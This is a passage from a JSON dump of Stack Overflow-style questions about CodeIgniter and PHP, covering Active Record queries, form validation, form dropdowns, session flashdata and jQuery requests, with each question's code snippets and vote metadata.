'1');\n$this-&gt;db-&gt;order_by('id');\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["php","mysql","codeigniter","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":257,"score":0,"question_id":11279262,"title":"Update Database Field Error CodeIgniter","body":"<p>I am getting the following error message in CodeIgniter 2.1:</p>\n\n<pre><code>A PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Array to string conversion\n\nFilename: database/DB_active_rec.php\n\nLine Number: 1407\n</code></pre>\n\n<p>I'm trying to update fields in my database. I have this code and every tutorial are just the same for batch upload. It works anyway but the thing is it display such an error.</p>\n\n<p>this what i have in my model:</p>\n\n<pre><code>function update2($data){\n   $this-&gt;db-&gt;update_batch('users',$data, \"id\");\n}\n</code></pre>\n\n<p>This what i have in my controller:</p>\n\n<pre><code>public function updateValues(){\n    $this-&gt;load-&gt;model('get_db');\n    $newRow = array(\n        array(\n            'id' =&gt; '3',\n            'firstname' =&gt; 'Rapphie'\n        ),\n        array(\n            'id' =&gt; '2',\n            'firstname' =&gt; 'Charmie'\n        )\n    );\n    $this-&gt;get_db-&gt;update2($newRow);\n    echo \"it has been updated\";\n}\n</code></pre>\n"},{"tags":["php","sql","query","codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12410322,"title":"Codeigniter db select","body":"<p>I want to select products from my table where is Akcie 1 and Stav also 1. But it it search query so I have there more like. It is not working why? Here is query</p>\n\n<pre><code>$q = $this-&gt;db-&gt;where('Akcia', 1)\n          -&gt;like('Titul', $vyraz)\n      -&gt;or_like('PodTitul', $vyraz)\n      -&gt;or_like('Autor1', $vyraz)\n      -&gt;or_like('Autor2', $vyraz)\n      -&gt;or_like('Autor3', $vyraz)\n      -&gt;or_like('Autor4', $vyraz)\n      -&gt;or_like('Prekladatel', $vyraz)\n      -&gt;or_like('Rozmer', $vyraz)\n      -&gt;or_like('Vydavatelstvo', $vyraz)\n      -&gt;or_like('ISBN', $vyraz)\n      -&gt;or_like('EAN', $vyraz)\n      -&gt;or_like('Popis', $vyraz)\n      -&gt;or_like('KratkyPopis', $vyraz)\n      -&gt;or_like('RokVydania', $vyraz)\n      -&gt;where('stav', 1)\n      -&gt;order_by('id', 'desc')\n      -&gt;limit($limit)\n      -&gt;offset($offset)\n     -&gt;get('knihy');\n\n         return $q-&gt;result();\n</code></pre>\n\n<p>This query is selcting also pruduts where Akcia is 0 why?</p>\n"},{"tags":["codeigniter","activerecord","login","throttling"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13114514,"title":"Login Throttling Function with Active Record","body":"<p>I have a function that I found that was wrote to use PDO, I modified it to use codeigniters active record db class. Everything work EXCEPT when I place the code within a function like so:</p>\n\n<pre><code>    function login_attempt_count() {\n\n      $seconds = 10;\n         // First we delete old attempts from the table \n      $oldest1 = strtotime(date('Y-m-d H:i:s').' - '.$seconds.' seconds');\n      $oldest2 = date('Y-m-d H:i:s',$oldest1);\n      $del_data = $oldest2;\n      $this-&gt;db-&gt;where('when &lt;', $del_data);\n      $this-&gt;db-&gt;delete('Login_Attempts');\n        // Next we insert this attempt into the table\n      $data = array(\n      'ip' =&gt; $_SERVER['REMOTE_ADDR'],\n      'when' =&gt; date(\"Y-m-d H:i:s\"));\n      $this-&gt;db-&gt;insert('Login_Attempts', $data);\n\n        // Finally we count the number of recent attempts from this ip address \n      $count = 'SELECT count(*) as number FROM Login_Attempts WHERE ip = ?';\n      $num = $this-&gt;db-&gt;query($count, $_SERVER['REMOTE_ADDR']);\n      if ($num-&gt;num_rows() &gt; 0){\n        foreach($num-&gt;result() as $attempt){\n          $attempts = $attempt-&gt;number;\n            return $attempts;\n        }\n      }\n }   \n</code></pre>\n\n<p>using it like this:</p>\n\n<pre><code>    $max_attempts = 3;\n\n    if(login_attempt_count() &lt;= $max_attempts) {\n        echo 'login';\n    }else{\n        echo 'To many attempts';\n    } \n</code></pre>\n\n<p>or this:</p>\n\n<pre><code> $a = login_attempt_count();\n</code></pre>\n\n<p>Causes the rest of the page to not load. So this indicates an error.\nAgain if I use the code within the function, outside the function, it works as expected.</p>\n\n<p>Or if there is a completely better and more secure method that I should be using I am open for suggestions.  Thanks!</p>\n"},{"tags":["jquery","codeigniter",".post"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":450,"score":0,"question_id":9058635,"title":"Jquery .post and Codeigniter issue","body":"<p>I am trying to use $.post to send the data to Controller and receive the returned data. I use project_detail/pub as my designated url and want to return <code>$go</code> from the controller. However, The returned data is a html page which is from 'show' function not 'pub' function. I have no idea what's going on. Please help. Thanks a lot.  </p>\n\n<p>view page: Jquery code</p>\n\n<pre><code>$(document).ready(function(){\n    $('#update').click(function(){\n    var tableVal=new Array();\n        //get the value from table td       \n        $('#projects tr td').each(function (){\n            tableVal[this.id] = $(this).text();\n        });\n\n        //send data to the controller 'project_detail' and function 'pub' with .post    \n        $.post('project_detail/pub', {'tableVal':tableVal},function(result)\n        {\n            alert(result);\n        })\n    })\n});\n</code></pre>\n\n<p>Controller code</p>\n\n<p>\n\n<pre><code>class Project_detail extends CI_Controller{\n\n    function __construct()\n    {\n        parent::__construct();\n    }\n\n    //The url I send to with .post and want to return $go \n    public function pub()\n    {\n    $go='test! test!';\n    return $go;\n    }\n\n    //for some reasons, `$this-&gt;load-&gt;view('include/template', $data)` is loaded to the     \n    //result in view page instead of $go\n    public function show () \n    {                   \n        $data['view']='project_detail_V';\n        $this-&gt;load-&gt;view('include/template', $data);\n\n    }\n\n\n}     \n</code></pre>\n"},{"tags":["php","codeigniter","codeigniter-datamapper"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":95,"score":1,"question_id":13054474,"title":"Codeigniter - get related data rows as structures/objects, not array","body":"<p>Im a newbie in CodeIgniter.</p>\n\n<p>I have created model for Pizza table and Ingredients table. Tables are joined by additional Pizza_Ingredients table (its many to many relation).</p>\n\n<p>My model:</p>\n\n<pre><code>&lt;?php\n\nclass Pizza extends DataMapper {\n\n    var $table = 'Pizza';\n\n    var $has_many = \n        array(\n        'ingredients' =&gt; \n            array(\n            'class' =&gt; 'ingredients',\n            'join_table' =&gt; 'pizza_ingredients'\n            )\n        );\n}\n\nclass Ingredients extends DataMapper {\n\n    var $table = 'Ingredients';\n    var $has_many = \n        array(\n            'pizza' =&gt; \n                array(\n                'class' =&gt; 'pizza',\n                'join_table' =&gt; 'pizza_ingredients'\n             )\n        );\n}\n\n?&gt;\n</code></pre>\n\n<p>When I get data using that code:</p>\n\n<pre><code>$pm = new Pizza();\n$pm-&gt;include_related('ingredients');\n$array = $pm-&gt;get();\n</code></pre>\n\n<p>im getting array which has duplicated Pizza values (it looks like just sql query result).</p>\n\n<pre><code>margherita    | cheese\nvegetariana   | vegetable 1\nvegetariana   | vegetable 2\n</code></pre>\n\n<p>I can't simple generate html table in \"foreach\" on array like this.</p>\n\n<p>i want to get object, that has structure like this:</p>\n\n<pre><code>margherita:\n - cheese\n\nvegetariana:\n - vegetable 1\n - vegetable 2\n</code></pre>\n\n<p>that allows me to make foreach loop (with pizzas) with other foreach loop (with ingredients) inside \"pizza loop\".</p>\n\n<p>I have to write this in PHP, or CodeIgniter/DataMapper can do something more for me?</p>\n\n<p>Any advice?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2529,"score":0,"question_id":2623751,"title":"form_dropdown in codeigniter","body":"<p>I'm getting a strange behaviour from form_dropdown - basically, when I reload the page after validation, the values are screwed up.</p>\n\n<p>this bit generates 3 drop downs with days, months and years:</p>\n\n<pre><code>$days = array(0 =&gt; 'Day...');\n        for ($i = 1; $i &lt;= 31; $i++)\n        {\n            $days[] = $i;\n        }\n        $months = array(0 =&gt; 'Month...', );\n        for ($i = 1; $i &lt;= 12; $i++)\n        {\n            $months[] = $i;\n        }\n        $years = array(0 =&gt; 'Year...');\n        for ($i = 2010; $i &lt;= 2012; $i++)\n        {\n            $years[$i] = $i; \n            echo \"&lt;pre&gt;\"; print_r($years); echo \"&lt;/pre&gt;\";//remove this\n        }\n\n        $selected_day = (isset($selected_day)) ? $selected_day : 0;\n        $selected_month = (isset($selected_month)) ? $selected_month : 0;\n        $selected_year = (isset($selected_year)) ? $selected_year : 0;\n        echo \"&lt;p&gt;\";\n            echo form_label('Select date:', 'day', array('class' =&gt; 'left'));\n            echo form_dropdown('day', $days, $selected_day, 'class=\"combosmall\"'); \n            echo form_dropdown('month', $months, $selected_month, 'class=\"combosmall\"'); \n            echo form_dropdown('year', $years, $selected_year, 'class=\"combosmall\"'); \n        echo \"&lt;/p&gt;\";\n</code></pre>\n\n<p>...and generates this:</p>\n\n<pre><code>    &lt;p&gt;&lt;label for=\"day\" class=\"left\"&gt;Select date:&lt;/label&gt;&lt;select name=\"day\" class=\"combosmall\"&gt; \n&lt;option value=\"0\" selected=\"selected\"&gt;Day...&lt;/option&gt; \n&lt;option value=\"1\"&gt;1&lt;/option&gt; \n&lt;option value=\"2\"&gt;2&lt;/option&gt; \n&lt;option value=\"3\"&gt;3&lt;/option&gt; \n&lt;option value=\"4\"&gt;4&lt;/option&gt; \n&lt;option value=\"5\"&gt;5&lt;/option&gt; \n&lt;option value=\"6\"&gt;6&lt;/option&gt; \n&lt;option value=\"7\"&gt;7&lt;/option&gt; \n&lt;option value=\"8\"&gt;8&lt;/option&gt; \n&lt;option value=\"9\"&gt;9&lt;/option&gt; \n&lt;option value=\"10\"&gt;10&lt;/option&gt; \n&lt;option value=\"11\"&gt;11&lt;/option&gt; \n&lt;option value=\"12\"&gt;12&lt;/option&gt; \n&lt;option value=\"13\"&gt;13&lt;/option&gt; \n&lt;option value=\"14\"&gt;14&lt;/option&gt; \n&lt;option value=\"15\"&gt;15&lt;/option&gt; \n&lt;option value=\"16\"&gt;16&lt;/option&gt; \n&lt;option value=\"17\"&gt;17&lt;/option&gt; \n&lt;option value=\"18\"&gt;18&lt;/option&gt; \n&lt;option value=\"19\"&gt;19&lt;/option&gt; \n&lt;option value=\"20\"&gt;20&lt;/option&gt; \n&lt;option value=\"21\"&gt;21&lt;/option&gt; \n&lt;option value=\"22\"&gt;22&lt;/option&gt; \n&lt;option value=\"23\"&gt;23&lt;/option&gt; \n&lt;option value=\"24\"&gt;24&lt;/option&gt; \n&lt;option value=\"25\"&gt;25&lt;/option&gt; \n&lt;option value=\"26\"&gt;26&lt;/option&gt; \n&lt;option value=\"27\"&gt;27&lt;/option&gt; \n&lt;option value=\"28\"&gt;28&lt;/option&gt; \n&lt;option value=\"29\"&gt;29&lt;/option&gt; \n&lt;option value=\"30\"&gt;30&lt;/option&gt; \n&lt;option value=\"31\"&gt;31&lt;/option&gt; \n&lt;/select&gt;&lt;select name=\"month\" class=\"combosmall\"&gt; \n&lt;option value=\"0\" selected=\"selected\"&gt;Month...&lt;/option&gt; \n&lt;option value=\"1\"&gt;1&lt;/option&gt; \n&lt;option value=\"2\"&gt;2&lt;/option&gt; \n&lt;option value=\"3\"&gt;3&lt;/option&gt; \n&lt;option value=\"4\"&gt;4&lt;/option&gt; \n&lt;option value=\"5\"&gt;5&lt;/option&gt; \n&lt;option value=\"6\"&gt;6&lt;/option&gt; \n&lt;option value=\"7\"&gt;7&lt;/option&gt; \n&lt;option value=\"8\"&gt;8&lt;/option&gt; \n&lt;option value=\"9\"&gt;9&lt;/option&gt; \n&lt;option value=\"10\"&gt;10&lt;/option&gt; \n&lt;option value=\"11\"&gt;11&lt;/option&gt; \n&lt;option value=\"12\"&gt;12&lt;/option&gt; \n&lt;/select&gt;&lt;select name=\"year\" class=\"combosmall\"&gt; \n&lt;option value=\"0\" selected=\"selected\"&gt;Year...&lt;/option&gt; \n&lt;option value=\"2010\"&gt;2010&lt;/option&gt; \n&lt;option value=\"2011\"&gt;2011&lt;/option&gt; \n&lt;option value=\"2012\"&gt;2012&lt;/option&gt; \n&lt;/select&gt;&lt;/p&gt;\n</code></pre>\n\n<p>however, when the form is reloaded after validation, the same code above generates this:</p>\n\n<pre><code>&lt;!-- days and months... --&gt;\n&lt;select name=\"year\" class=\"combosmall\"&gt; \n&lt;option value=\"0\" selected=\"selected\"&gt;Year...&lt;/option&gt; \n&lt;option value=\"1\"&gt;2010&lt;/option&gt; \n&lt;option value=\"2\"&gt;2011&lt;/option&gt; \n&lt;option value=\"3\"&gt;2012&lt;/option&gt; \n&lt;/select&gt;\n</code></pre>\n\n<p>So basically the value start from 1 instead of 2010. The same happens to days and months but obviously it doesn't make any difference in this particular case as the values would start from 1 anyway.</p>\n\n<p>How can I fix this - and why does it happen?</p>\n\n<p>edit: validation rules are:</p>\n\n<pre><code>$this-&gt;load-&gt;library('form_validation');\n//...rules for other fields..\n$this-&gt;form_validation-&gt;set_rules('day', 'day', 'required|xss_clean');\n$this-&gt;form_validation-&gt;set_rules('month', 'month', 'required|xss_clean');\n$this-&gt;form_validation-&gt;set_rules('year', 'year', 'required|xss_clean');        \n$this-&gt;form_validation-&gt;set_error_delimiters('&lt;p class=\"error\"&gt;', '&lt;/p&gt;');\n//define other errors\nif($this-&gt;input-&gt;post('day') == 0 || $this-&gt;input-&gt;post('month') == 0 || $this-&gt;input-&gt;post('year') == 0) \n    {\n        $data['error'] = \"Please check the date of your event.\";\n    }         \n</code></pre>\n"},{"tags":["php","codeigniter","logic"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13106508,"title":"PHP test for empty and/or null and/or unset array","body":"<p>I want to keep this short. I don't know if I have the terminology correct, but I got this example from the <em>Codeigniter handbook Vol.1</em>. </p>\n\n<pre><code>if (count($args) &gt; 1 || is_array($args[0]))\n</code></pre>\n\n<p>I've run into this problem numerous times. Depending on the datatype different tests are more appropriate. Some tests will just fail in unexpected ways.</p>\n\n<p>How does one determine the most appropriate, and possibly, the most concise test?</p>\n\n<p>Just to be clear I'm looking for the most effective way to test if an object/variable is ready to use, regardless of the datatype, if that's possible.</p>\n\n<p>Also I don't want the solution to apply merely to lists like in the example. It should be widely applicable.</p>\n"},{"tags":["codeigniter","parsing","domdocument"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13113598,"title":"can't get link tag on rss page using html_dom library","body":"<p>i'm trying to parse a rss feed using codeigniter <a href=\"http://www.ecliptik.net/en/html-dom.html\" rel=\"nofollow\">html_dom</a> lib\nit works grate with html pages but when i parse rss page ,  it can't identify the <code>link</code> tag .</p>\n\n<p>it works fine with other tags ! i've tried it on the bunch of rss feed and it's the same on all of them .</p>\n\n<pre><code>    ini_set('max_execution_time',120) ;\n\n    // Simple call to remote URL\n\n     $rss  = $this-&gt;curl-&gt;simple_get('http://rss.groups.yahoo.com/group/ydn-javascript/rss');\n     $this-&gt;html_dom-&gt;loadHTML($rss);\n     echo $links =  $this-&gt;html_dom-&gt;find('link' , 0 )-&gt;innertext;\n</code></pre>\n\n<p>this returns nothing but if i put <code>description</code> instead of <code>link</code> it returns the first description tag inner text .</p>\n\n<p>i thought since links are clickable on the rss page , somehow the structure changes \nafter the code gets executed and that's why it cant identify the <code>link</code> tag . </p>\n\n<p>but when i look it the source code after browser renders the page it's still the same structure with link tag like other tags . i can use <code>DOMDocument</code> class but this is cleaner .</p>\n"},{"tags":["php","validation","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1018,"score":1,"question_id":6448151,"title":"Codeigniter form validation to model logic","body":"<p>I'm working on my first CodeIgniter application and have encountered some confusion around handling post data. </p>\n\n<p>More specifically, I understand the role of <code>$this-&gt;form_validation-&gt;set_rules()</code>, and how <code>set_value()</code> works to repopulate input values when the validation failed, but what I can't figure out is if <code>$this-&gt;input-&gt;post</code> is the same value as the <code>set_value</code> equivalent. </p>\n\n<p>I understand that the majority of validation rules would have a boolean result, however what about ones like <code>trim|htmlspecialchars</code> - these also have the benefit of preparing the data for db queries. </p>\n\n<p>So in my model, can I access the inputs after being processed by the Form Validation library, or should I do the additional preparation inside the model directly onto <code>$this-&gt;input-&gt;post('variable')</code>? </p>\n\n<p>My gut tells me that I should add final processing like <code>htmlspecialchars</code> right before the SQL in the model, as it is really a db specific operation (I would not want <code>&amp;amp;</code> instead of <code>&amp;</code> in my form inputs, but I would want <code>&amp;amp;</code> in the database). </p>\n\n<p>Incidentally in my reading I did come across <code>$this-&gt;validation-&gt;variable</code> which would appear to have been the answer to my question in previous CI versions. </p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13110913,"title":"codeigniter get_where with mysql functions in check values","body":"<p>Just a question about the <code>get_where</code> function of codeigniter Active Records. I wanted to get a query which should be like this:</p>\n\n<pre><code>Select * from foo \nwhere date = STR_TO_DATE('$month/$day/$year','%m/%d/%Y') \n  and time = STR_TO_DATE('$hour:$minute$ampm', '%l:%i%p')\n</code></pre>\n\n<p>Now I created a function in my model which appears like this:</p>\n\n<pre><code>public function validate_if_existing($month,$day,$year,$hour,$minute,$ampm)\n{\n    $event_date = \"STR_TO_DATE('$month/$day/$year','%m/%d/%Y')\";\n    $event_time = \"STR_TO_DATE('$hour:$minute$ampm', '%l:%i%p')\";\n\n    $this-&gt;db-&gt;flush_cache();\n    $query = $this-&gt;db-&gt;get_where('foo',array('event_date' =&gt; $event_date,'event_time'=&gt; $event_time));\n\n    return $query-&gt;num_rows();\n}\n</code></pre>\n\n<p>But it returns <code>0</code> rows where I expected it to be <code>1</code>. I tried to check the <code>$event_date</code> and <code>$event_time</code> contents and it just appears exactly as I expected. Like this:</p>\n\n<pre><code>STR_TO_DATE('01/01/2012','%m/%d/%Y')\n</code></pre>\n\n<p>Am I doing this wrong? Anyway to solve this out?</p>\n"},{"tags":["codeigniter","form-validation","multilanguage"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12068250,"title":"CodeIgniter form validation multilanguage labels","body":"<p>I'm currently working on a website that can be viewed in 3 different languages. I've put all text into languages files and almost everything is working as expected. \nThings like configuration for pagination I've put into a configuration file and into <code>application/config</code>, like this:</p>\n\n<pre><code>&lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\n$config['num_links']      = 2;\n$config['full_tag_open']  = '&lt;p class=\"pagination\"&gt;';\n$config['full_tag_close'] = '&lt;/p&gt;';\n$config['first_link']     = '&amp;laquo;&amp;nbsp;' . lang('first');\n$config['last_link']      = lang('last') . '&amp;nbsp;&amp;raquo;';\n</code></pre>\n\n<p>And it works great, but I've tried the same for my form validation configuration file, like this:</p>\n\n<pre><code>&lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\n$config = array(\n\n    'login' =&gt; array(\n        array(\n            'field' =&gt; 'login_email',\n            'label' =&gt; lang('emailaddress'),\n            'rules' =&gt; 'trim|required|valid_email|min_length[6]'\n        ),\n        array(\n            'field' =&gt; 'login_password',\n            'label' =&gt; lang('password'),\n            'rules' =&gt; 'trim|required'\n        ),\n    ),\n</code></pre>\n\n<p>But this doesn't seem to work. It looks like this configuration file gets loaded before the language files/library.\nAnd to be honest, at the moment I don't really have an idea how to fix this other than taking everything out of the configuration file again, and put it into the controller, but I'd rather not do this.</p>\n\n<p>Any ideas how to fix this?</p>\n"},{"tags":["codeigniter","session"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13109522,"title":"$this->session->set_flashdata() and then $this->session->flashdata() doesn't work in codeigniter","body":"<p>Please take a look at the following code:</p>\n\n<pre><code>$this-&gt;session-&gt;set_flashdata('message', 'This is a message.');\nvar_dump($this-&gt;session-&gt;flashdata('message'));\n</code></pre>\n\n<p>It returns <code>bool(false)</code>.</p>\n\n<p>I hope it doesn't <strong><em>NEED</em></strong> a <code>redirect()</code> to be recallable after that, because some times I need to call it right after setting the flashdata in a view.</p>\n\n<hr>\n\n<p><strong>Edit</strong> after <a href=\"http://stackoverflow.com/users/1679342/venkat\">venkat</a>'s comment</p>\n\n<pre><code>$this-&gt;session-&gt;set_flashdata('message', 'This is a message.');\n$this-&gt;session-&gt;keep_flashdata('message');\nvar_dump($this-&gt;session-&gt;flashdata('message'));\n</code></pre>\n\n<p>No difference unfortunately.</p>\n"},{"tags":["php","codeigniter","datetime","expires"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":54,"score":-1,"question_id":13108927,"title":"PHP- how to retrieve expire datetime","body":"<p>i need to retrieve the expire datetime starting from the current datetime + some time.</p>\n\n<p>The example is:</p>\n\n<pre><code>$current_datetime = date('Y-m-d H:m:s');\n$expire_time = 24;// 1 day in hours as int() for example ;)\n\n$expire_datetime = date($current_datetime + $expire_time); //don't know how to do this in Y-m-d H:m:s format!!\n</code></pre>\n\n<p>thanks for all will help me, i would like to write down an helper lib starting from this script.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":53,"score":1,"question_id":13108799,"title":"Issues with passing PHP echo in form through POST method","body":"<pre><code>&lt;form method=\"POST\" name=\"send\"\n&lt;input type=\"hidden\" name=\"title\" value=\"&lt;?php echo ($pro-&gt;title;?)\"&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>I dont want people to see the hidden informations , Is this the best way to pass the variable over to my controller?</p>\n\n<p>This the code in my controller</p>\n\n<pre><code>$this-&gt;email-&gt;subject('subject '.$_POST['title'].' ' );\n</code></pre>\n\n<p>Thank you!</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":30,"score":-1,"question_id":13108508,"title":"how can I attach the file in Codeigniter which i have created through coding?","body":"<p>i have created a pdf file from coding and i want that pdf file to send by attaching in the email.Can anyone help?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13102126,"title":"How to check all database for availability in CI 2","body":"<p>I have config file database.php with 5 databases.</p>\n\n<p>How can I get 500 error with message \"Site is not available\" in all pages, if one of a database is not available?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13106126,"title":"CodeIgniter form data from database and set value of input sequencely","body":"<p>I have product data from database and trying to set value of inputs in edit form but have no idea how to manage for and foreach loop :( here is code I am trying</p>\n\n<pre><code>&lt;table id=\"dyTable\"&gt;\n      &lt;thead&gt;\n      &lt;th style=\"width:20px; padding-right:10px;\"&gt;No.&lt;/th&gt;\n      &lt;th style=\"width:70px; padding-right:10px;\"&gt;Quantity&lt;/th&gt;\n      &lt;th style=\"width:290px; padding-right:10px;\"&gt;Product&lt;/th&gt;\n      &lt;th style=\"width:100px; padding-right:10px;\"&gt;Unit Price&lt;/th&gt;\n      &lt;/thead&gt;\n      &lt;tbody&gt;\n\n      &lt;?php \n\n        for($r=1; $r&lt;=$pr_value; $r++){\n            foreach($inv_products as $prod):\n\n            $quantity.$r = array('name' =&gt; $quantity.$r,\n                'id' =&gt; $quantity.$r,\n                'type' =&gt; 'text',\n                'value' =&gt; $this-&gt;form_validation-&gt;set_value($prod-&gt;quantity),\n                'class'       =&gt; 'text',\n                'style' =&gt; 'width: 70px; text-align: center;'\n            );\n            $product.$r = array('name' =&gt; $product.$r,\n                'id' =&gt; $product.$r,\n                'type' =&gt; 'select',\n                'value' =&gt; $this-&gt;form_validation-&gt;set_select($prod-&gt;product_id),\n                'class' =&gt; 'chzn-select',\n                'style' =&gt; 'width:300px;'\n            );\n            $unit_price.$r = array('name' =&gt; $unit_price.$r,\n                'id' =&gt; $unit_price.$r,\n                'type' =&gt; 'text',\n                'value' =&gt; $this-&gt;form_validation-&gt;set_value($prod-&gt;unit_price),\n                'class'       =&gt; 'text',\n                'style' =&gt; 'width: 100px; text-align: right;'\n            );\n            ?&gt;\n\n              &lt;tr id=\"line&lt;?php echo $r; ?&gt;\"&gt;\n              &lt;td style=\"width: 20px; text-align: center; padding-right: 10px; padding-right: 10px;\"&gt;&lt;?php echo $r; ?&gt;&lt;/td&gt;\n              &lt;td&gt;&lt;?php echo form_input($quantity.$r);?&gt;&lt;/td&gt;\n              &lt;td&gt;&lt;?php echo form_dropdown($product.$r);  ?&gt;&lt;/td&gt;\n              &lt;td&gt;&lt;?php echo form_input($unit_price.$r);?&gt;&lt;/td&gt;\n              &lt;/tr&gt;\n            &lt;?php\n\n            endforeach;\n        } \n        ?&gt;\n\n      &lt;/tbody&gt;\n</code></pre>\n\n<p></p>\n\n<p>Now $r become an array. Any idea how to achieve this.Thanks in advance </p>\n"},{"tags":["jquery","json","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13107773,"title":"Get Json data from controller","body":"<p>I need to create dinamic select into my form.\nI have wrote this code to get it dinamically from my controller (CodeIgniter) that get data from model.</p>\n\n<p>This is the script:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n   $(document).ready(function(){\n                    $(\"select#regione\").change(function(){\n                        $.getJSON(\"http://test:8888/ricerca/test\",{id: $(this).val()}, function(dati){\n                            var options = '';\n                            for (var i = 0; i &lt; dati.length; i++) {\n                                options += '&lt;option value=\"' + dati[i].valore + '\"&gt;' + dati[i].etichetta + '&lt;/option&gt;';\n                            }\n                            $(\"#provincia\").html(options);\n                            $('#provincia option:first').attr('selected', 'selected');\n                        });\n                    });\n                });\n            &lt;/script&gt;\n</code></pre>\n\n<p>This is the dropdown form:</p>\n\n<pre><code>&lt;form action=\"base_url().'ricerca'\" method=\"post\"&gt;\n&lt;select name=\"regione\" id=\"regione\"&gt;\n&lt;option value=\"\"&gt;No option&lt;/option&gt;\n&lt;option value=\"Lombardia\"&gt;Lombardia&lt;/option&gt;\n&lt;option value=\"Lazio\"&gt;Lazio&lt;/option&gt;\n&lt;/select&gt;\n\n&lt;select name=\"provincia\" id=\"provincia\"&gt;\n&lt;/select&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>and this is the controller:</p>\n\n<p>\n\n<pre><code>class Ricerca extends CI_Controller\n{\n public function test()\n{\n $dati = array();\n         array_push($dati,array(\"valore\"=&gt;\"ciao\", \"etichetta\"=&gt;\"ciao\"));\n         array_push($dati,array(\"valore\"=&gt;\"mamma\", \"etichetta\"=&gt;\"mamma\"));\n         return json_encode($dati);\n}\n}\n</code></pre>\n\n<p>Before to do my query in the model I would see if my script works but if I select an option in the first select called \"Regione\" the script does nothing</p>\n"},{"tags":["php","codeigniter","breadcrumbs"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":2503,"score":2,"question_id":6494080,"title":"What is the best way to make a breadcrumb with Code Igniter?","body":"<p>I wonder what a best way to make a breadcrumb with Code Igniter.</p>\n\n<p>1 : Retrieve the strings with URL</p>\n\n<p>example : <code>$this-&gt;uri-&gt;segment(2)</code></p>\n\n<p>2 : Do you know another way ?</p>\n\n<p>I'd really like to have your opinion </p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13106499,"title":"Database query returns strange values for display in codeigniter","body":"<p>I'm having a hard time again in my query for codeigniter. First of all I read about this tutorials to base the work I'm doing in current: <a href=\"http://codeigniter.com/user_guide/tutorial/news_section.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/tutorial/news_section.html</a></p>\n\n<p>Now what I do is something like this for the model function for my database:</p>\n\n<pre><code>public function get_events()\n    {\n            $id = $this-&gt;session-&gt;userdata('id');\n            $this-&gt;db-&gt;flush_cache();\n            $this-&gt;db-&gt;select('event_id');\n            $this-&gt;db-&gt;select('event_name');\n            $this-&gt;db-&gt;select('event_date');\n            $this-&gt;db-&gt;select('event_time');\n            $this-&gt;db-&gt;select('event_count');\n            $this-&gt;db-&gt;select('event_max');\n            $this-&gt;db-&gt;select('status');\n            $query = $this-&gt;db-&gt;get_where('event_details',array('bar_id' =&gt; $id));\n            return $query-&gt;row_array();\n    }\n</code></pre>\n\n<p>And now to pass the values in my controller I use this line of code:</p>\n\n<pre><code>$data['events'] = $this-&gt;events_model-&gt;get_events();\n</code></pre>\n\n<p>And for the view I use this:</p>\n\n<pre><code>&lt;table class=\"events_list\"&gt;\n&lt;?php foreach ($events as $events_info): ?&gt;\n    &lt;tr&gt;\n        &lt;td&gt;\n            &lt;input type=\"hidden\" value=\"&lt;?php echo $events_info['id'] ?&gt;\"&gt;\n            &lt;?php echo $events_info['event_name'] ?&gt;\n        &lt;/td&gt;\n        &lt;td&gt;\n            &lt;?php echo $events_info['event_date'] ?&gt;\n        &lt;/td&gt;\n        &lt;td&gt;\n            &lt;?php echo $events_info['event_time'] ?&gt;\n        &lt;/td&gt;\n        &lt;td&gt;\n            &lt;?php echo $events_info['event_count'].'/'.$events_info['event_max'] ?&gt;\n        &lt;/td&gt;\n        &lt;td&gt;\n            &lt;?php echo $events_info['status'] ?&gt;\n        &lt;/td&gt;\n    &lt;/tr&gt;\n&lt;?php endforeach ?&gt;\n&lt;/table&gt;\n</code></pre>\n\n<p>I'm supposed to get a return of:</p>\n\n<pre><code>(hidden)1 | Silverstein Concert | 2012-07-11 | 18:00:00 | 0/500 | 1\n</code></pre>\n\n<p>but instead I get a return of </p>\n\n<pre><code>1 | 1 | 1 | 1/1 | 1 